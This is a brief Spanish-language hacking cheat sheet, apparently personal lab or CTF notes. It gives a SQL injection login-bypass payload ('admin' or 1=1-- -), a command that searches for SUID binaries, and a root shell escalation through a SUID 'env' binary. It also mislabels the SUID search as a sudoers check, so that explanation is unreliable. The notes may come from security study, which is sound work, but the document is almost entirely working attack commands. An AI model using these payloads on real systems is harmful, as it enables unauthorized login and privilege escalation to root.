# Injection

SQL Injection, validación para que siempre se cumpla que
`admin' or 1=1-- -`

Escalar privilegios > comprobamos qué binarios están disponibles a nivel de sudoers:
`find / -perm -4000 2>/dev/null`
> /usr/bin/env

El binario env cuando tiene permisos SUID tiene una escalada de privilegios
Para poder ejecutar hay que estar en el directorio /usr/bin
>`./env /bin/sh -p`
